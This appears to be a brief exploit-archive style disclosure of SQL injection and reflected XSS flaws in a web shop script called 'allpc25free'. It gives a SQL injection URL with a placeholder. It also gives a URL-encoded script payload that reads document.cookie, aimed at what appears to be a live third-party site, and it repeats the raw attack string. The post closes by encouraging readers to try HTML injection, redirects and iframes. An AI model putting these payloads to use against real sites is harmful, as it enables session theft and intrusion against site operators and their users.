[+].  SQL-i Vulnerability
=+=+=+=+=+=+=+=+=+

[P0C]:  http://127.0.0.1/allpc25free/product_info.php?products_id=[SQL Injection]

[DemO]: http://127.0.0.1/allpc25free/product_info.php?products_id=[SQL Injection]

[+]. XSS Vulnerability
=+=+=+=+=+=+=+=+=

The Search B0x of this script is vulnerable to XSS,because it fails to properly sanitize the response.
By submitting a malicious input to the web site, the user would only be able to compromise their security.That is their own browser cookies, cache objects, and so forth.


[DemO]: http://neways4u.com/advanced_search_result.php?keywords=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

[Atack Pattern]: "><script>alert(document.cookie)</script>

 I used this pattern to show you that is vulnerable,but you can try HTML Injection,Url Redirect, Iframe,Etc.. Basically Your own Imagination is your Limit..
 Good Luck :P
